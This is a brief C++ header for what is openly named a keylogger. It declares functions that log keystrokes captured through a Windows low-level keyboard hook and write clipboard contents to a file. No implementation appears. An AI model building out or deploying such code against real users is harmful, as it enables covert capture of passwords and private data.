#pragma once

#include <windows.h>
#include <fstream>

namespace keylogger
{
		void logKeyboard(const KBDLLHOOKSTRUCT* kbHook);
		void writeClipboardData(std::wofstream& stream);
};
